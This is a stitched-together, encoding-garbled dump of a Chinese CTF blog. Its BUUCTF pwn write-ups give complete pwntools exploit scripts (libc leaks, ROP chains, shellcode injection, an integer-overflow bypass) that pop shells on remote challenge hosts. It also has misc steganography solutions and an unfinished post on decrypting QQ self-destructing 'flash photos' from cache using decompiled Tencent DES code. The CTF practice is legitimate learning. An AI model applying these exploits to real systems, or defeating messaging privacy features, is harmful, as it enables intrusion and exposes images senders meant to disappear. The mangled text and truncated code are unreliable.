ˆæº¢å‡ºï¼Œçœ‹å‡½æ•°åˆ—è¡¨å¯ä»¥çœ‹åˆ°å­˜åœ¨è¾“å‡ºå‡½æ•°writeï¼Œæ‰€ä»¥æ€è·¯å°±æ˜¯åˆ©ç”¨writeå‡½æ•°æ³„éœ²å‡ºå‡½æ•°åœ°å€è·å–libcä»è€Œå¾—åˆ°systemä»¥åŠbin/shçš„åœ°å€æœ€åè·³è½¬æ‰§è¡Œ\nEXP123456789101112131415161718192021from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;i386&#x27;#p = process(&#x27;./2018_rop&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,25468)elf = ELF(&#x27;2018_rop&#x27;)write_plt = elf.plt[&#x27;write&#x27;]write_got = elf.got[&#x27;write&#x27;]main = elf.symbols[&quot;_start&quot;]payload = &#x27;a&#x27;*0x88+&#x27;a&#x27;*4+p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)  # æ³„éœ²writeå‡½æ•°åœ°å€è¿”å›åœ°å€ä¸ºmainå‡½æ•°p.sendline(payload)write_addr = u32(p.recv(4))libc = LibcSearcher(&#x27;write&#x27;, write_addr)libcbase = write_addr - libc.dump(&#x27;write&#x27;)system_addr = libcbase+libc.dump(&#x27;system&#x27;)binsh_addr = libcbase+libc.dump(&#x27;str_bin_sh&#x27;)ret_addr = 0x08048199payload2 = &#x27;a&#x27;*0x88+&#x27;a&#x27;*4+p32(ret_addr)+p32(system_addr)+&#x27;a&#x27;*4+p32(binsh_addr)  # retç”¨æ¥å¹³è¡¡å †æ ˆp.sendline(payload2)p.interactive()\n\n\n\nbabyropå°±æ˜¯ç®€å•çš„æ ˆæº¢å‡ºï¼Œè·³è½¬æ‰§è¡Œsystemå‡½æ•°å°±è¡Œ\nEXP12345678910from pwn import *p = process(&#x27;./babyrop&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,25222)pop_rdi_ret = 0x0400683binsh_addr = 0x00601048system_addr = 0x400490ret_addr = 0x0400479payload = &#x27;a&#x27;*0x18+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)p.sendline(payload)p.interactive()\n\n\n\nbjdctf_2020_babyropå’Œ2018_ropä¸€æ ·ï¼Œæ²¡ä»€ä¹ˆåŒºåˆ«\nEXP123456789101112131415161718192021222324252627from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;p = process(&#x27;./bjdctf_2020_babyrop&#x27;)#p = remote(&#x27;node4.buuoj.cn&#x27;,26466)elf = ELF(&#x27;bjdctf_2020_babyrop&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main = elf.symbols[&quot;main&quot;]pop_rdi_ret = 0x0400733payload = &#x27;a&#x27;*0x28+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendlineafter(&#x27;story!&#x27;,payload)p.recv()puts_addr=u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))print hex(puts_addr)libc = LibcSearcher(&quot;puts&quot;,puts_addr)libcbase = puts_addr-libc.dump(&#x27;puts&#x27;)print hex(libcbase)system_addr = libcbase+libc.dump(&#x27;system&#x27;)print hex(system_addr)binsh_addr=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)print hex(binsh_addr)ret_addr = 0x004004c9payload2 = &#x27;a&#x27;*0x28+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)p.sendline(payload2)p.interactive()\n\n\n\nbjdctf_2020_babystack2æ•´æ•°æº¢å‡ºã€‚ç¨‹åºå…ˆæ˜¯è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªæ•°å€¼ï¼Œä¹‹ååˆ¤æ–­æ˜¯å¦è¶…è¿‡10ï¼Œè¶…è¿‡å°±å¼¹å‡ºè­¦å‘Šå¹¶é€€å‡ºï¼Œå°äºå°±ä¼šè®©æˆ‘ä»¬è¾“å…¥ï¼Œå¤§å°ä¸ºæˆ‘ä»¬ä¹‹å‰å¡«çš„å€¼ã€‚é€šè¿‡åˆ†æï¼Œæˆ‘ä»¬è¾“å…¥çš„å€¼æ ¹æœ¬ä¸èƒ½å®ç°æ ˆæº¢å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—æ¢ä¸€ç§æ–¹æ³•ã€‚\nåœ¨readè¯»å–æ—¶ï¼Œä¼šå°†nbytesè½¬æ¢ä¸ºæ— ç¬¦å·æ•°ã€‚è¿™é‡Œè¡¥å……ä¸€ç‚¹çŸ¥è¯†ï¼šæœ‰ç¬¦å·æ•°ï¼šä¸Šé™+1=ä¸‹é™ï¼›ä¸‹é™-1=ä¸Šé™ã€‚æ— ç¬¦å·æ•°ï¼šä¸Šé™+1=0ï¼Œæ‰€ä»¥æ— ç¬¦å·æ•°æ°¸è¿œæ²¡æœ‰æº¢å‡ºã€‚è¿˜æœ‰ä¸€ç‚¹ï¼Œæœ‰ç¬¦å·æ•°å’Œæ— ç¬¦å·æ•°çš„æœ€å¤§å€¼æ˜¯ä¸ä¸€æ ·çš„ï¼Œæ— ç¬¦å·æ•°æ¯”æœ‰ç¬¦å·æ•°å¤§åˆ°è¿‘ä¸€å€ã€‚\nå› ä¸ºä¸€å¼€å§‹æ˜¯æœ‰ç¬¦å·æ•°æˆ‘ä»¬å¯ä»¥è¾“å…¥æœ‰ç¬¦å·æ•°ä¸Šé™+1çš„å€¼ï¼š2147483648ï¼Œç¨‹åºåˆ¤æ–­æ—¶ä¼šå°†å…¶åˆ¤æ–­æˆ-2147483648ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡åˆ¤æ–­ï¼Œä¹‹åè¯»å–æ—¶ï¼Œè½¬ä¸ºæ— ç¬¦å·æ•°å°±å˜æˆäº†2147483648ï¼Œä»è€Œé€ æˆæ ˆæº¢å‡ºã€‚\nEXP12345678from pwn import *#p = process(&#x27;./bjdctf_2020_babystack2&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,28597)p.sendlineafter(&#x27;name:\\n&#x27;,&#x27;2147483648&#x27;)ret_addr = 0x0400599payload = &#x27;a&#x27;*0x18+p64(ret_addr)+p64(0x400726)p.sendline(payload)p.interactive()\n\n\n\nciscn_2019_en_2libcæ³„éœ²ï¼Œæ€è·¯æ˜¯ä¸€æ ·çš„ï¼Œç›´æ¥ä¸ŠEXP\nEXP12345678910111213141516171819202122232425262728293031323334from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;#p = process(&#x27;./ciscn_2019_en_2&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,26466)elf = ELF(&#x27;ciscn_2019_en_2&#x27;)puts_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]main = elf.symbols[&quot;_start&quot;]pop_rdi_ret = 0x400c83payload1 = &#x27;\\x00&#x27;+&#x27;a&#x27;*0x4f+&#x27;a&#x27;*8+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)p.recvuntil(&#x27;Input your Plaintext to be encrypted\\n&#x27;)p.sendline(payload1)p.recvline()p.recvline()puts_addr=u64(p.recv(6).ljust(8,&#x27;\\x00&#x27;))p.info(&#x27;puts_addr==&gt;%#x&#x27;,puts_addr)#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)libc = LibcSearcher(&quot;puts&quot;,puts_addr)libcbase = puts_addr-libc.dump(&#x27;puts&#x27;)print hex(libcbase)system_addr = libcbase+libc.dump(&#x27;system&#x27;)print hex(system_addr)binsh_addr=libcbase+libc.dump(&#x27;str_bin_sh&#x27;)print hex(binsh_addr)ret_addr = 0x004006b9p.sendlineafter(&#x27;Input your choice!\\n&#x27;,&#x27;1&#x27;)payload2 = &#x27;\\x00&#x27;+&#x27;a&#x27;*0x4f+&#x27;a&#x27;*8+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)p.recvuntil(&#x27;Input your Plaintext to be encrypted\\n&#x27;)p.sendline(payload2)p.interactive()\n\n\n\nciscn_2019_n_5ç¨‹åºä¼šå…ˆé€šè¿‡readå‡½æ•°è¯»å–è¾“å…¥åˆ°bssæ®µä¸­ï¼Œä¹‹ååœ¨åˆ©ç”¨getsè¯»å–è¾“å…¥ã€‚å› ä¸ºæ²¡æœ‰è¾“å‡ºæ‰€ä»¥ä¸å¥½ç”¨libcæ³„éœ²ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡å–æ³¨å…¥æ‰§è¡Œshellcodeçš„æ–¹å¼æ¥è·å–shellã€‚é¦–å…ˆï¼Œå…ˆç”Ÿæˆshellcodeåˆ°bssæ®µï¼Œä¹‹ååˆ©ç”¨getè·³è½¬åˆ°è¿™ä¸ªshellcodeå¹¶æ‰§è¡Œã€‚\nEXP123456789101112from pwn import *#p = process(&#x27;./ciscn_2019_n_5&#x27;)p = remote(&#x27;node4.buuoj.cn&#x27;,29575)shellcode_addr = 0x0601080context.arch=&quot;amd64&quot;shellcode=asm(shellcraft.sh())  # ç”Ÿæˆshellcodepayload1 = shellcodep.sendlineafter(&#x27;tell me your name\\n&#x27;,payload1)payload2 = &#x27;a&#x27;*0x28+p64(shellcode_addr)  # è·³è½¬åˆ°shellcodep.sendlineafter(&#x27;me?\\n&#x27;,payload2)p.interactive()\n\n\n\nciscn_2019_ne_5ç¨‹åºä¼šå…ˆè®©æˆ‘ä»¬è¾“å…¥å¯†ç ï¼Œå¯†ç å¯ä»¥ç›´æ¥é€šè¿‡IDAæŸ¥çœ‹ï¼Œä¹‹åä¼šæœ‰å‡ ä¸ªé€‰é¡¹ï¼Œç¬¬ä¸€ä¸ªé€‰é¡¹æ˜¯è®©æˆ‘ä»¬è¾“å…¥ä¸€äº›ä¸œè¥¿ï¼Œç¬¬äºŒä¸ªæ˜¯åˆ é™¤ï¼Œç¬¬ä¸‰ä¸ªæ˜¯è¾“å‡ºï¼Œåœ¨IDAé‡Œé¢æŸ¥çœ‹ï¼Œå…¶å®è¿˜å¯ä»¥è¾“å…¥é€‰é¡¹4ï¼Œé€‰é¡¹4æ‰æ˜¯çœŸæ­£çš„è¾“å‡ºï¼Œé€‰é¡¹3è¾“å‡ºçš„æ˜¯å›ºå®šçš„å€¼ï¼Œé€‰é¡¹4ä¼šè¾“å‡ºæˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„ä¸œè¥¿\nè¿›å…¥é€‰é¡¹4ï¼Œå®ƒä¼šå°†æˆ‘ä»¬ä¹‹å‰è¾“å…¥çš„å€¼å¤åˆ¶ç»™destï¼Œå®Œäº‹åå°±è·³è½¬\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªå‡½æ•°è·³è½¬åˆ°shellcode\næ‰€ä»¥æˆ‘ä»¬çš„åŸºæœ¬æ€è·¯ï¼š\n\nè¾“å…¥å¯†ç è¿›å…¥é€‰æ‹©ç•Œé¢\né€šè¿‡é€‰é¡¹1å°†æˆ‘ä»¬çš„ROPé“¾å†™å…¥è¿›å»\nåœ¨é€šè¿‡é€‰é¡¹3è·³è½¬åˆ°æˆ‘ä»¬è®¾è®¡å¥½çš„ROPé“¾\n\nEXP12345678910111213141516from pwn import *context.arch=&quot;i386&quot;context.os=&#x27;linux&#x27;p = remote(&#x27;node4.buuoj.cn&#x27;,26828)#p = process(&#x27;./ciscn_2019_ne_5&#x27;)sh_addr = 0x080482easys_addr = 0x80484D0payload1 = &#x27;administrator&#x27;p.sendlineafter(&#x27;password:&#x27;,payload1)payload2 = &#x27;a&#x27;*0x4c+p32(sys_addr)+&#x27;a&#x27;*4+p32(sh_addr)p.recvuntil(&#x27;Exit\\n&#x27;)p.sendlineafter(&#x27;:&#x27;,&#x27;1&#x27;)p.sendlineafter(&#x27;info:&#x27;,payload2)p.recvuntil(&#x27;Exit\\n&#x27;)p.sendlineafter(&#x27;:&#x27;,&#x27;4&#x27;)p.interactive()\n\n\n\nlevel2_x64åŸºæœ¬çš„ROPï¼Œç›´æ¥ä¸ŠEXP\nEXP12345678910from pwn import *p = remote(&#x27;node4.buuoj.cn&#x27;,29042)#p = process(&#x27;./level2_x64&#x27;)binsh_addr = 0x0600A90 system_addr = 0x04004C0pop_rdi_ret = 0x04006b3  #ROPgadget --binary level2_x64 --only &#x27;pop|ret&#x27;|grep &#x27;rdi&#x27;ret_addr = 0x4004a1payload = &#x27;a&#x27;*0x88+p64(ret_addr)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)p.sendline(payload)p.interactive()\n\n","slug":"BUU-PWN","date":"2021-10-16T05:47:11.000Z","categories_index":"åˆ·é¢˜","tags_index":"pwn","author_index":"Krito"},{"id":"794e58abd4973dfacdc6d660b3849142","title":"BUU misc","content":"é‡‘ä¸‰èƒ–ä¸‹è½½é™„ä»¶ï¼Œæ‰“å¼€æ˜¯gifï¼Œä»”ç»†çœ‹å‘ç°gifä¼šé—ªç°ä¸€äº›å­—ç¬¦ï¼Œé€šè¿‡åˆ©ç”¨Stegsolveæˆ–è€…PSé€å¸§åˆ†æåˆå¹¶å°±å¯å¾—åˆ°flag\n\näºŒç»´ç åœ¨çº¿æ‰«ç ï¼Œå¾—åˆ°secret is here\nç”¨winhexæ‰“å¼€å‘ç°å›¾ç‰‡é‡Œé¢è—äº†å‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…é‡Œé¢æœ‰ä¸€ä¸ª4number.txtæ–‡ä»¶\nåˆ©ç”¨binwalkåˆ†ç¦»å¾—åˆ°ä¸€ä¸ªåŠ å¯†çš„æ–‡ä»¶ï¼Œ4numberåº”è¯¥æ˜¯æç¤ºï¼Œæç¤ºå¯†ç åªæœ‰å››ä½æ•°ï¼Œç›´æ¥çˆ†ç ´å¾—åˆ°å¯†ç ï¼Œæ‰“å¼€flag\nNç§æ–¹æ³•è§£å†³é™„ä»¶æ˜¯exeæ–‡ä»¶ï¼Œæ— æ³•ç›´æ¥è¿è¡Œï¼Œæ‹–è¿›winhexé‡Œé¢å‘ç°æ˜¯åå…­è¿›åˆ¶æ˜¯base64ç¼–ç çš„å›¾ç‰‡ï¼Œè§£ç å¾—åˆ°äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag\nå¤§ç™½é¢˜ç›®ç»™äº†æç¤ºï¼Œæ˜¯ä¸æ˜¯å±å¹•å¤ªå°äº†ï¼Œå†çœ‹çœ‹é™„ä»¶ï¼Œå‘ç°é«˜åº¦æ˜æ˜¾æœ‰é—®é¢˜ï¼Œç›´æ¥ä¿®æ”¹é«˜åº¦å¾—åˆ°flag\nä½ ç«Ÿç„¶èµ¶æˆ‘èµ°ç­¾åˆ°é¢˜ï¼Œå°†é™„ä»¶æ‹–è¿›winhexï¼Œåœ¨æœ€ä¸‹é¢å‘ç°flag\nåŸºç¡€ç ´è§£æç¤ºå¯†ç æ˜¯å››ä½æ•°ï¼Œç›´æ¥çˆ†ç ´ï¼Œå¾—åˆ°å¯†ç ï¼Œæ‰“å¼€å‘ç°å†…å®¹è¢«åŠ å¯†ï¼ŒçŒœæµ‹æ˜¯base64\nbase64è§£ç å¾—åˆ°flag\n\nä¹Œé•‡å³°ä¼šç§å›¾ç­¾åˆ°é¢˜ï¼Œæ‹–è¿›winhexæ‹‰åˆ°æœ€åº•ä¸‹å°±å¯ä»¥çœ‹åˆ°flag\nLSBæ ¹æ®é¢˜ç›®åï¼ŒLSBï¼ˆLeast Significant Bitï¼‰ï¼Œæ„ä¸ºæœ€ä½æœ‰æ•ˆä½ï¼›MSBï¼ˆMost Significant Bitï¼‰ï¼Œæ„ä¸ºæœ€é«˜æœ‰æ•ˆä½ã€‚ä½¿ç”¨Stegsolve\nä¿å­˜ï¼Œå‘ç°æ˜¯ä¸€ä¸ªäºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag\næ–‡ä»¶ä¸­çš„ç§˜å¯†æ‹–è¿›winhexï¼Œä½¿ç”¨binwalkæ²¡æœ‰å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œæ‰“å¼€ç…§ç‰‡å±æ€§é‡Œé¢å‘ç°å¤‡æ³¨æœ‰flag\nraræ ¹æ®æç¤ºçˆ†ç ´ï¼Œå¾—åˆ°å¯†ç æ‰“å¼€å°±æ˜¯flag\n\nqrç­¾åˆ°é¢˜ï¼Œæ‰«ç å¾—åˆ°flag\nzipä¼ªåŠ å¯†çœ‹åå­—å°±çŸ¥é“æ˜¯ä¼ªåŠ å¯†ï¼Œæ‹–è¿›winhexï¼Œä¿®æ”¹åç›´æ¥æ‰“å¼€å°±èƒ½å¾—åˆ°flag\nningenå°†æ–‡ä»¶ä¸¢è¿›winhexï¼Œæ‹–åˆ°æœ€åå¯ä»¥çœ‹åˆ°ç…§ç‰‡é‡Œé¢è—äº†å‹ç¼©åŒ…ï¼Œè¿˜æœ‰ä¸€ä¸ªtxtæ–‡ä»¶\nç›´æ¥ä¿®æ”¹åç¼€åï¼Œå‘ç°ä¸€ä¸ªåŠ å¯†txtæ–‡ä»¶ï¼Œæ ¹æ®é¢˜ç›®æç¤ºçˆ†ç ´å¾—åˆ°å¯†ç ï¼Œæ‰“å¼€æ–‡ä»¶å¾—åˆ°flag\né•œå­é‡Œé¢çš„ä¸–ç•Œä½¿ç”¨winhexæ²¡æœ‰å‘ç°ä»€ä¹ˆä¸œè¥¿ï¼Œçœ‹åˆ°æ–‡ä»¶åç›²çŒœä½¿ç”¨Stegsolveä¿®æ”¹æœ€ä½æœ‰æ•ˆä½ï¼Œæœç„¶ï¼Œå¾—åˆ°flag\nå°æ˜çš„ä¿é™©ç®±æ‹–è¿›winhexï¼Œåœ¨æ–‡ä»¶æœ€åå‘ç°æœ‰ä¸ª2.txtæ–‡ä»¶ï¼ŒçŒœæµ‹é‡Œé¢è—äº†å‹ç¼©åŒ…ï¼Œä½¿ç”¨binwalkåˆ†ç¦»ï¼Œå¾—åˆ°å‹ç¼©åŒ…\næ ¹æ®æç¤ºè¿›è¡Œçˆ†ç ´å¾—åˆ°flag\nçˆ±å› æ–¯å¦æ‹–è¿›winhexï¼Œå‘ç°é‡Œé¢è—æœ‰å‹ç¼©åŒ…ï¼Œç›´æ¥æ”¹åç¼€åï¼Œå°è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ä¸æ˜¯ä¼ªåŠ å¯†ï¼Œè¿”å›ç…§ç‰‡æŸ¥çœ‹ï¼Œåœ¨å±æ€§å¤‡æ³¨é‡Œé¢å‘ç°å¯†ç ï¼Œæ”¹æˆzipå°±å¯ä»¥çœ‹åˆ°flagäº†\n","slug":"BUU-MISC","date":"2021-10-16T00:48:04.000Z","categories_index":"åˆ·é¢˜","tags_index":"misc","author_index":"Krito"},{"id":"cca552dbfefca5d5c398c58d9b5bb49c","title":"QQé—ªç…§ç ´è§£ï¼ˆå¾…å®Œç»“ï¼‰","content":"\n\n\n\n\n\n\n\n\nå’Œæœ‹å‹èŠå¤©æ—¶çªå‘å¥‡æƒ³ï¼Œæƒ³å°è¯•ä¸€ä¸‹è·å–é—ªç…§æºæ–‡ä»¶ï¼Œå¿™äº†ä¸€ä¸ªä¸‹åˆè¿˜æ˜¯æ²¡æœ‰è§£å†³ï¼ˆä¸»è¦æ˜¯å¤ªèœäº† /(ã„’oã„’)/~~ ï¼‰\nåŸç†å’Œæ€è·¯é—ªç…§è²Œä¼¼æ˜¯ä¸€ç§æœ¨é©¬æ”¹ç¼–è€Œæ¥ï¼Œä½†æ˜¯å› ä¸ºå®ç”¨æ€§ä¸é«˜å¯èƒ½å°±è¢«è®¾è®¡æˆé—ªç…§äº†ï¼ˆç›²çŒœï¼‰ã€‚é—ªç…§çš„å·¥ä½œåŸç†å¤§æ¦‚æ˜¯æœ‰ä¸€ä¸ªFLAG_SECUREçª—å£ï¼Œå¦‚æœå¯ç”¨äº†FLAG_SECUREï¼Œé‚£ä¹ˆå°†ä¸å…è®¸ç”¨æˆ·åœ¨æ­¤ç•Œé¢æˆªå›¾/å½•å±ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸å…è®¸æˆªå›¾è¿™ä¸ªåŠŸèƒ½æ˜¯Androidç³»ç»Ÿæä¾›ç»™å¼€å‘è€…çš„ã€‚å½“æ—¶é—´ä¸€è¿‡ï¼Œç¨‹åºå°±ä¼šè‡ªåŠ¨å°†é—ªç…§åˆ é™¤ã€‚åœ¨æ­¤è¿‡ç¨‹ä¸­æœ‰ä¸ªå¾ˆå¤§çš„å¼Šç«¯ï¼Œå°±æ˜¯åœ¨ç…§ç‰‡è¿˜æœªè¯»å–æ—¶ï¼Œç…§ç‰‡ä¼šå­˜åœ¨äºç¼“å­˜ä¹‹ä¸­ï¼Œå¾ˆå®¹æ˜“è¢«æå–å‡ºæ¥æŸ¥çœ‹ã€‚\næ‰€ä»¥åœ¨2021å¹´ä»¥å‰çš„qqï¼Œé—ªç…§åŸºæœ¬ä¸Šå’Œæ™®é€šç…§ç‰‡æ²¡ä»€ä¹ˆåŒºåˆ«ï¼Œåªè¦åœ¨ç¼“å­˜ä¸­æå–åˆ°å°±å¯ä»¥ä¿å­˜èµ·æ¥ã€‚ä½†æ˜¯ç°åœ¨å·²ç»è¢«ä¿®å¤äº†ï¼Œç½‘ä¸Šå¤§éƒ¨åˆ†æ•™ç¨‹å·²ç»å¤±æ•ˆäº†ã€‚ï¼ˆå¯èƒ½æŸäº›å¤§ä½¬è‡ªå·±ç ´è§£äº†ï¼Œåªæ˜¯æˆ‘ä¸çŸ¥é“ï¼‰ã€‚ç°åœ¨çš„é—ªç…§åœ¨ç¼“å­˜ä¸­æå–åˆ°æ”¹åç¼€å·²ç»æ²¡æœ‰ç”¨äº†ï¼Œå› ä¸ºç°åœ¨çš„ç…§ç‰‡å·²ç»è¢«åŠ å¯†äº†ï¼ˆæ–‡ä»¶å¤´å°±å†™ç€åŠ å¯†äºŒå­—ğŸ˜’ï¼‰\næ¥ä¸‹æ¥å°±æ˜¯è®²è®²æˆ‘è‡ªå·±çš„æ€è·¯ï¼š\n1ã€é¦–å…ˆæ‰¾åˆ°ç¼“å†²åŒºæ–‡ä»¶ï¼Œè·¯å¾„ï¼ˆAndriod/data/com.tecent.mobileqq/Tencent/MobileQQ/chatpic/chatimgï¼‰ï¼Œé‡Œé¢çš„ä¸œè¥¿åº”è¯¥å’Œä¸‹é¢å·®ä¸å¤šï¼ˆå¦‚æœæ‰¾ä¸åˆ°å¯èƒ½æ˜¯æ²¡æœ‰æ‰“å¼€æ˜¾ç¤ºéšè—æ–‡ä»¶ã€‚ï¼‰ï¼Œä¹‹åæŒ‰ç…§æ—¶é—´é¡ºåºæ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶ã€‚\nå½“åˆæ‰¾åˆ°ä»¥åé«˜å…´äº†è€åŠå¤©ï¼Œç»“æœæ‰“å¼€å‘ç°è¢«åŠ å¯†äº†ï¼Œæ°”çš„æƒ³æ‰“äººã€‚åé¢çœ‹åˆ°ä¸€ä¸ªå¤§ä½¬è®²è§£ï¼Œå‘ç°æ˜¯desåŠ å¯†ï¼ˆå°±çŸ¥é“è…¾è®¯ä¸ä¼šå‹¤å¿«åˆ°è‡ªå·±å†™å‡ºç®—æ³•ï¼‰ä»–é€šè¿‡TIM2.1.0çš„apkåç¼–è¯‘äº†ä¸€ä¸‹ï¼Œå‘ç°com.tencent.mobileqq.utils.DESUtilä¸­æœ‰å‡ ä¸ªå‡½æ•°å¯ä»¥åŠ è§£å¯†é—ªç…§å›¾ç‰‡ï¼Œå‘ç°ä½¿ç”¨çš„æ˜¯javax.cryptoåŠ è§£å¯†ã€‚\nè¿™ä¸ªç±»å¤§æ¦‚å°±æ˜¯ä¸‹é¢è¿™ä¸ªæ ·å­ï¼Œå…¶ä¸­byte[]å‚æ•°æ˜¯åŠ è§£å¯†çš„key\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167/* * Decompiled with CFR 0_123. */package com.tencent.mobileqq.utils;import com.tencent.mobileqq.utils.FileUtils;import com.tencent.qphone.base.util.QLog;import java.io.File;import java.io.FileInputStream;import java.io.FileOutputStream;import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.io.RandomAccessFile;import java.io.UnsupportedEncodingException;import java.security.Key;import javax.crypto.Cipher;import javax.crypto.CipherInputStream;import javax.crypto.CipherOutputStream;import javax.crypto.spec.SecretKeySpec;public class DESUtil &#123;    public static void a(File var0, File var1_6, byte[] var2_8) &#123;\t//åŠ å¯†        var6_15 = new SecretKeySpec(DESUtil.a((byte[])var2_8), &quot;DES&quot;);        var2_8 = Cipher.getInstance(&quot;DES&quot;);        var2_8.init(1, (Key)var6_15);        var6_15 = new FileInputStream((File)var0);        var0 = new FileOutputStream((File)var1_6);        var1_6 = new CipherInputStream((InputStream)var6_15, (Cipher)var2_8);        try &#123;            var2_8 = new byte[1024];            var0.write(&quot;ENCRYPT:&quot;.getBytes(&quot;UTF-8&quot;));//å†™æ–‡ä»¶å¤´            while ((var3_16 = var1_6.read((byte[])var2_8)) != -1) &#123;                var0.write((byte[])var2_8, 0, var3_16);            &#125;        &#125;        catch (Exception var4_11) &#123;\t\t//ç•¥\t&#125;    &#125;    public static void a(String string, String string2) &#123;\t//å¸¦æ—¥å¿—çš„åŠ å¯†å‡½æ•°ï¼Œé‡Œé¢è°ƒç”¨äº†ä¸Šé¢çš„a(File,File,byte[])        try &#123;            if (DESUtil.a(string)) &#123;                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)2, (String)(&quot;encrypt had encrypt,file:&quot; + string));                    return;                &#125;            &#125; else &#123;                long l = System.currentTimeMillis();                Object object = string + &quot;.tmp&quot;;                File file = new File(string);                long l2 = file.length() / 1024;                if ((object = new File((String)object)).exists()) &#123;                    object.delete();                &#125;                DESUtil.a(file, (File)object, string2.getBytes(&quot;UTF-8&quot;));                FileUtils.a((File)object, (File)file);                object.delete();                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)4, (String)(&quot;DES Encrypt filePath:&quot; + string + &quot;,key:&quot; + string2 + &quot;,costTime:&quot; + (System.currentTimeMillis() - l) + &quot;,fileSize:&quot; + l2 + &quot;KB&quot;));                    return;                &#125;            &#125;        &#125;        catch (UnsupportedEncodingException unsupportedEncodingException) &#123;            unsupportedEncodingException.printStackTrace();        &#125;    &#125;    public static void a(String string, String object, String string2) &#123;\t//è¿˜æ˜¯å¸¦æ—¥å¿—çš„åŠ å¯†å‡½æ•°ï¼Œé‡Œé¢è°ƒç”¨äº†ä¸Šé¢çš„a(File,File,byte[])        try &#123;            if (DESUtil.a(string)) &#123;                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)2, (String)(&quot;encrypt had encrypt,file:&quot; + string));                    return;                &#125;            &#125; else &#123;                long l = System.currentTimeMillis();                File file = new File(string);                long l2 = file.length() / 1024;                if ((object = new File((String)object)).exists()) &#123;                    object.delete();                &#125;                DESUtil.a(file, (File)object, string2.getBytes(&quot;UTF-8&quot;));                file.delete();                if (QLog.isDevelopLevel()) &#123;                    QLog.d((String)&quot;DESUtil&quot;, (int)4, (String)(&quot;DES Encrypt filePath:&quot; + string + &quot;,key:&quot; + string2 + &quot;,costTime:&quot; + (System.currentTimeMillis() - l) + &quot;,fileSize:&quot; + l2 + &quot;KB&quot;));                    return;                &#125;            &#125;        &#125;        catch (UnsupportedEncodingException unsupportedEncodingException) &#123;            unsupportedEncodingException.printStackTrace();        &#125;    &#125;    public static boolean a(String var0) &#123;\t//åç¼–è¯‘å‡ºæ¥çš„ä»£ç æ¯”ä¸Šé¢çš„è¿˜ä¹±æ­¤ç•¥ï¼Œ\t//ä»QLogå†™å…¥çš„å†…å®¹å¤§è‡´å¯ä»¥çœ‹å‡ºè¯¥å‡½æ•°çš„ä½œç”¨åº”è¯¥æ˜¯æ£€æŸ¥æ–‡ä»¶æ˜¯å¦å·²ç»åŠ /è§£å¯†è¿‡    &#125;    public static byte[] a(byte[] arrby) &#123;        //ä¿è¯keyæ•°ç»„å®šé•¿æ˜¯8ï¼Ÿ        byte[] arrby2 = new byte[8];        if (arrby2.length &gt; arrby.length) &#123;            System.arraycopy(arrby, 0, arrby2, 0, arrby.length);            return arrby2;        &#125;        System.arraycopy(arrby, 0, arrby2, 0, arrby2.length);        return arrby2;    &#125;    public static void b(File var0, File var1_5, byte[] var2_7) &#123;\t//è§£å¯†        var2_7 = new SecretKeySpec(DESUtil.a((byte[])var2_7), &quot;DES&quot;);        var6_15 = Cipher.getInstance(&quot;DES&quot;);        var6_15.init(2, (Key)var2_7);        var2_7 = new RandomAccessFile((File)var0, &quot;r&quot;);        var2_7.seek(&quot;ENCRYPT:&quot;.getBytes(&quot;UTF-8&quot;).length);//è·³è¿‡æ–‡ä»¶å¤´        var0 = new CipherOutputStream(new FileOutputStream((File)var1_5), var6_15);        try &#123;            var1_5 = new byte[1024];            while ((var3_16 = var2_7.read((byte[])var1_5)) != -1) &#123;                var0.write((byte[])var1_5, 0, var3_16);            &#125;        &#125;        catch (Exception var4_10) &#123;            //ç•¥        &#125;    &#125;    public static void b(String string, String string2) &#123;\t//å¸¦æ—¥å¿—çš„è§£å¯†        try &#123;            if (!DESUtil.a(string)) &#123;                if (QLog.isDevelopLevel()) 